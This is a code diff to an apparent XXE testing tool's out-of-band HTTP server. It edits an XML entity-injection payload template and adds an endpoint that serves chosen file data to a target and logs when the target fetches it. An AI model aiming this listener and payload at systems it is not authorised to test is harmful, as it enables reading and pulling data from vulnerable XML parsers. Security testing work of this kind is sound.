@@ -5,7 +5,7 @@ import functools
 from typing import Dict
 from urllib import parse
 
-ENTITY_INJECTION_TEMPLATE = "<!DOCTYPE stuff [<!ELEMENT data ANY> <!ENTITY goodies \"{0}\">]> <data>&goodies;</data>"
+ENTITY_INJECTION_TEMPLATE = "<!DOCTYPE stuff [<!ELEMENT data ANY> <!ENTITY goodies {0}>]> <data>&goodies;</data>"
 
 
 def _wrapper(func):
@@ -36,6 +36,7 @@ class OOBHttpServer:
 
         self.expectations: Dict[str, asyncio.Future] = {}
         self.entity_files = {}
+        self.file_data = {}
 
         self.test_response_value = random.randint(1, 10_000_00)
 
@@ -54,13 +55,14 @@ class OOBHttpServer:
         app.router.add_route("GET", self.test_entity_url, _wrapper(self.test_entity_handler))
         app.router.add_route("GET", "/entity/{id}", _wrapper(self.entity_handler))
         app.router.add_route("GET", "/data/{id}", _wrapper(self.data_handler))
+        app.router.add_route("GET", "/download/{id}", _wrapper(self.download_handler))
         return app
 
     def test_handler(self, request: web.Request):
         return f"<data>{self.test_response_value}</data>"
 
     def test_entity_handler(self, request: web.Request):
-        return ENTITY_INJECTION_TEMPLATE.format(self.test_response_value)
+        return ENTITY_INJECTION_TEMPLATE.format(f'"{self.test_response_value}"')
 
     def entity_handler(self, request: web.Request):
         file_id = request.match_info["id"]
@@ -81,6 +83,16 @@ class OOBHttpServer:
         self.got_data(expect_id, data)
         return f"<data>{self.test_response_value}</data>"
 
+    def download_handler(self, request: web.Request):
+        expect_id = request.match_info['id']
+
+        if not self.expecting_identifier(expect_id):
+            print(f'Not expecting ID {expect_id}')
+            return 404
+
+        self.got_data(expect_id, True)
+        return f"<data>{self.file_data[expect_id]}</data>"
+
     def got_data(self, expect_id, data):
         self.expectations[expect_id].set_result(data)
         del self.expectations[expect_id]
@@ -92,15 +104,24 @@ class OOBHttpServer:
         self._tick += 1
         return str(self._tick)
 
-    def expect_data(self):
+    def _expect(self):
         identifier, future = self.get_identifier(), asyncio.Future()
         self.expectations[identifier] = future
+        return identifier, future
+
+    def expect_data(self):
+        identifier, future = self._expect()
         return f'{self.location}/data/{identifier}', future
 
     def expect_entity_injection(self, entity_value):
-        identifier, future = self.expect_data()
+        identifier, future = self._expect()
         self.entity_files[identifier] = entity_value
         return f'{self.location}/entity/{identifier}', future
+
+    def expect_file_download(self, file_data):
+        identifier, future = self._expect()
+        self.file_data[identifier] = file_data
+        return f'{self.location}/download/{identifier}', future
 
     async def start(self):
         loop = asyncio.get_event_loop()
@@ -114,5 +135,6 @@ class OOBHttpServer:
             self.port = self._server.sockets[0].getsockname()[1]
 
     async def stop(self):
+        print('Stopping')
         self._server.close()
         await self._server.wait_closed()
